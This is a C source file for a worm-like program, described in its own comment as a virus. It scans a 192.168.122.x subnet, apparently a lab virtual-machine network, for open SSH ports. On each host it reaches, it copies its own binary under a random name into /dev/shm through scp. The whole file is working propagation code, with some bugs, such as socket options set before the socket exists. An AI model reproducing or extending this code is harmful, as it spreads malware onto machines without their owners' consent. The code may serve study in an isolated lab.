#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/time.h>

#define FILENAME_SIZE 20
#define BUFFER_SIZE 256
#define SOCKET_TIMEOUT 1

void generate_random_string(char *str) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const size_t charset_size = sizeof(charset) - 1;
    memset(str, 0x0, FILENAME_SIZE);
    for (int i = 0; i < FILENAME_SIZE; i++) {
        str[i] = charset[rand() % charset_size];
    }
}

void generate_random_seed(char *seed) {
    FILE *dev_urandom_fd = fopen("/dev/urandom", "r");
    if(dev_urandom_fd != NULL) {
        *seed = getc(dev_urandom_fd);
    }
}

int main(int argc, char **argv) {
    char ip_range[] = "192.168.122.",
        master_ip[] = "192.168.122.1";
    char cmd_buffer[BUFFER_SIZE],
        rnd_name_buffer[FILENAME_SIZE];
    int port = 22,
        startHost   = 0,
        endHost     = 254;
    char seed;
    
    // get main seed from reading 1 byte of urandom
    generate_random_seed(&seed);

    // start ip range scan
    for (int i = startHost; i <= endHost; i++) {
        pid_t pid = fork();

        if (pid < 0) {
            perror("fork() failed");
            exit(EXIT_FAILURE);
        }

        // in child process
        if (pid == 0) {
            // generate prng from child specific seed
            srand(seed ^ (getpid()<<16));
            int sock;
            char targetIP[32];
            struct sockaddr_in server_addr;
            struct timeval timeout;

            // build target IP
            snprintf(targetIP, sizeof(targetIP), "%s%d", ip_range, i);

            // set timeout to close socket after X seconds without response
            timeout.tv_sec = SOCKET_TIMEOUT;
            timeout.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

            // Create the socket
            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                perror("socket() failed");
                exit(EXIT_FAILURE);
            }

            // build server_addr struct
            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            server_addr.sin_port   = htons(port);
            if (inet_pton(AF_INET, targetIP, &server_addr.sin_addr) <= 0) {
                perror("inet_pton() failed");
                close(sock);
                exit(EXIT_FAILURE);
            }

            // try socket connection
            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                // copy virus in tempfs
                generate_random_string(rnd_name_buffer);
                snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:/dev/shm/%s", argv[0], targetIP, rnd_name_buffer);
                system(cmd_buffer);
            }

            close(sock);
            exit(EXIT_SUCCESS);
        }
    }

    // wait all childs
    for (int i = startHost; i <= endHost; i++) {
        wait(NULL);
    }

    return 0;
}
